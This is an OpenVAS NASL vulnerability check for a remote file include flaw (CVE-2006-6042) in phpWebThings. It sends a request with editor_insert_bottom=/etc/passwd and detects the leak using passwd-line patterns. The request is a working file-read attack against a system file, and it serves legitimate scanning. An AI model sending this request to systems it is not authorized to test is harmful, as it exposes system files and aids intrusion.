# OpenVAS Vulnerability Test
# $Id: phpwebthings_rfi.nasl 16 2013-10-27 13:09:52Z jan $
# Description: phpWebThings editor_insert_bottom Parameter Remote File Include Vulnerability
#
# Authors:
# Justin Seitz <jms@bughunter.ca>
#
# Copyright:
# Copyright (C) 2006 Justin Seitz
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server contains a PHP script that is affected by a
remote file include issue. 

Description:

The remote web server is running phpWebThings, a PHP based photo
gallery management system. 

The version of phpWebThings installed on the remote host fails to
sanitize input to the 'editor_insert_bottom' parameter before using it
in the 'core/editor.php' script to include PHP code.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker can
exploit this issue to view arbitrary files and execute arbitrary code,
possibly taken from third-party hosts, on the remote host.";

tag_solution = "No patches or upgrades have been reported by the vendor at this time.";

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
if(description)
{
 # set script identifiers

 script_id(80078);;
 script_version("$Revision: 16 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");

 script_cve_id("CVE-2006-6042");
 script_bugtraq_id(21178);
 script_xref(name:"OSVDB", value:"30503");

 name = "phpWebThings editor_insert_bottom Parameter Remote File Include Vulnerability";
 summary = "Tries to read a local file with phpWebThings";
 family = "Web application abuses";

 script_name(name);
 script_description(desc);
 script_summary(summary);

 script_category(ACT_ATTACK);
 script_copyright("This script is Copyright (C) 2006 Justin Seitz");

 script_family(family);

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://milw0rm.com/exploits/2811");
 exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

#
# verify we can talk to the web server, if not exit
#

if(!get_port_state(port)) exit(0);
if(!can_host_php(port:port)) exit(0);

#
# create list of directories to scan
#


# Loop through directories.
if (thorough_tests) dirs = make_list("/phpwebthings", "/webthings", "/phpwt", "/things", cgi_dirs());
else dirs = make_list(cgi_dirs());
#
# Iterate through the list
#

file = "/etc/passwd";

foreach dir (dirs) {

#
#
#       Attack: Attempt a file include of /etc/passwd
#
#
  attackreq = http_get(item:string(dir, "/core/editor.php?editor_insert_bottom=", file),port:port);
  attackres = http_keepalive_send_recv(port:port, data:attackreq, bodyonly:TRUE);
  if (attackres == NULL) exit(0);
  if (egrep(pattern:"root:.*:0:[01]:", string:attackres) ||
    string("main(", file, "): failed to open stream: No such file") >< attackres ||
    "open_basedir restriction in effect. File(" >< attackres)   {

    passwd = "";
    if (egrep(pattern:"root:.*:0:[01]:", string:attackres))
      passwd = egrep(pattern:"^[a-z_0-9$-]+:.*:[0-9]*:[0-9]*:.*:", string:attackres);
	
    if (passwd) {
      if (dir == "") dir = "/";
      info = string("The version of phpWebThings installed in directory '", dir, "'\n",
        "is vulnerable to this issue. Here are the contents of /etc/passwd\n",
        "from the remote host :\n\n", passwd);
     report = string(desc,"\n\nPlugin output\n\n",info);
    }
    else report = desc;

    security_hole(data:report, port:port);
    exit(0);
  }
}

